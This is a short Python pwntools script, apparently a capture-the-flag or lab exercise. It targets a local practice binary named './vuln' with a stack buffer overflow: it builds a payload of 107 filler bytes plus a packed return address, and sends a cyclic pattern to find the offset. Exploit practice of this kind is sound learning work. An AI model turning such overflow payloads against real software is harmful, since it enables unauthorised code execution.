from pwn import *

offset = 107
add = p32(0x0804929b)
payload = b'a'*offset + add

c = process('./vuln')
print(c.recvline())
input()
#c.sendline(payload)
c.sendline(cyclic(60))
print(c.recv(30))
